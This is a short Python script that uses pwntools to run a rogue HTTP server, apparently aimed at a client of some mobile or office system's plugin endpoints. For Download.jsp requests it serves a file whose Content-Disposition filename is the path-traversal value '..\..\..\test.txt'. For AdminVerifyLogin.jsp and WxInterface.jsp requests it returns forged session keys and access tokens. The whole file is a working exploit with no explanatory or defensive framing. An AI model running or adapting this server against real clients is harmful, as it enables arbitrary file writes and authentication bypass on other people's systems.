from pwn import *

s = server(8080)

textContent='''
testtest
'''.strip()

response=f'''
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.8.10
Date: Wed, 04 Jan 2023 10:58:26 GMT
Content-type: application/octet-stream
Content-Length: {len(textContent)}
Content-Disposition: filename=..\\..\\..\\test.txt
Last-Modified: Tue, 03 Jan 2023 07:52:59 GMT

'''.strip().replace('\n', '\r\n')+'\r\n'*2+textContent

createOutSysResponse='''
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.8.10
Date: Wed, 04 Jan 2023 10:58:26 GMT
Content-type: application/json
Content-Length: 97
Last-Modified: Tue, 03 Jan 2023 07:52:59 GMT

{"message":"1","sessionkey":"aaaa","outsysid":"1234567","accesstoken":"1234567","cVersion":"100"}
'''.strip().replace('\n', '\r\n')+'\r\n'

while True:
    cc = s.next_connection()
    msg = cc.recv()
    if '/mobile/plugin/Download.jsp'.encode() in msg:
        downloadFlag='props'
        cc.send(response.encode())
    elif '/mobile/plugin/AdminVerifyLogin.jsp'.encode() in msg or '/mobile/plugin/WxInterface.jsp'.encode() in msg:
        cc.send(createOutSysResponse.encode())

